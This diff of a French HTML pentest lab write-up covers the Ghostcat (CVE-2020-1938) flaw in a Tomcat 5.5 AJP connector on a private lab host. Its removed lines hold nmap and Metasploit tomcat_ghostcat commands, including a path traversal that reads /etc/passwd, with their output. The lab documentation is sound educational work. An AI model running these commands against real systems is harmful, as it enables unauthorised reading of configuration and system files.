@@ -32,10 +32,6 @@
   </blockquote>
 
   <h2 class="section">1. Identification</h2>
-  <pre class="terminal">$ nmap -sC -sV -p 8009 192.168.56.102
-8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
-|_ajp-methods: Failed to get a valid response for the OPTION request</pre>
-
   <p>Le connecteur <strong>AJP13</strong> de Tomcat 5.5 est exposé directement — il n'est <strong>pas
   censé être exposé publiquement</strong> : il sert normalement à la communication interne entre
   un serveur web frontal et Tomcat.</p>
@@ -43,9 +39,8 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms1-ajp13/01-recon-nmap.png" alt="Scan nmap du port 8009">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc"><code>8009/tcp open ajp13 Apache Jserv (Protocol v1.3)</code>.</span>
-      <span class="fname">images/ms1-ajp13/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -54,13 +49,6 @@
   vise normalement des versions plus récentes. Vérification via la vraie source (pas de
   mémoire) :</p>
 
-  <pre class="terminal">$ msfconsole -q -x "info auxiliary/admin/http/tomcat_ghostcat; exit"
-Description:
-  In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to
-  7.0.99, Tomcat shipped with an AJP Connector enabled by default...
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2020-1938</pre>
-
   <p>Plage officielle confirmée : <strong>Tomcat 7.0.0 à 9.0.30</strong>. La cible est en
   <strong>Tomcat 5.5</strong>, antérieure à toute cette plage. D'après la CVE officielle, ça ne
   devrait pas s'appliquer.</p>
@@ -68,22 +56,15 @@ References:
   <figure class="capture" id="cap-range">
     <img src="../images/ms1-ajp13/02-verif-cve-range.png" alt="Plage de versions officielle Ghostcat">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Plage officielle de CVE-2020-1938 : Tomcat 7.0 à 9.0.30 — la cible en
       5.5 est en dehors, contraste volontaire.</span>
-      <span class="fname">images/ms1-ajp13/02-verif-cve-range.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation</h2>
   <p>Conformément à la méthodologie (vérifier plutôt que supposer), test effectif du module
   malgré la version :</p>
-
-  <pre class="terminal">$ msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; run; exit"
-&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee" ...&gt;
-  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
-  ...
-[+] 192.168.56.102:8009 - File contents save to: /home/josa/.msf4/loot/...web.xml....txt</pre>
 
   <blockquote class="evidence">
     <strong>⚠️ Résultat surprenant.</strong> Le module a bien récupéré
@@ -100,23 +81,14 @@ References:
   <figure class="capture" id="cap-webxml">
     <img src="../images/ms1-ajp13/03-ghostcat-webxml.png" alt="Lecture de WEB-INF/web.xml via AJP">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Contenu XML de <code>WEB-INF/web.xml</code> récupéré malgré la
       version — fichier sauvegardé dans le loot Metasploit.</span>
-      <span class="fname">images/ms1-ajp13/03-ghostcat-webxml.png</span>
     </figcaption>
   </figure>
 
   <p>Pour confirmer que ce n'est pas un hasard, test avec une traversée de chemin vers un
   fichier hors de l'application web :</p>
-
-  <pre class="terminal">$ msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; set FILENAME /../../../../../../etc/passwd; run; exit"
-root:x:0:0:root:/root:/bin/bash
-...
-msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
-...
-user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
-service:x:1002:1002:,,,:/home/service:/bin/bash</pre>
 
   <p><strong><code>/etc/passwd</code> entier récupéré</strong>, confirmant une vraie lecture
   arbitraire de fichiers système, pas limitée au webapp.</p>
@@ -124,11 +96,10 @@ service:x:1002:1002:,,,:/home/service:/bin/bash</pre>
   <figure class="capture" id="cap-passwd">
     <img src="../images/ms1-ajp13/04-ghostcat-etc-passwd.png" alt="Lecture de /etc/passwd via traversée de chemin AJP">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Comptes <code>msfadmin</code>, <code>user</code>, <code>service</code>
       lus dans <code>/etc/passwd</code> via traversée de chemin — résultat le plus fort de
       cette étape.</span>
-      <span class="fname">images/ms1-ajp13/04-ghostcat-etc-passwd.png</span>
     </figcaption>
   </figure>
 
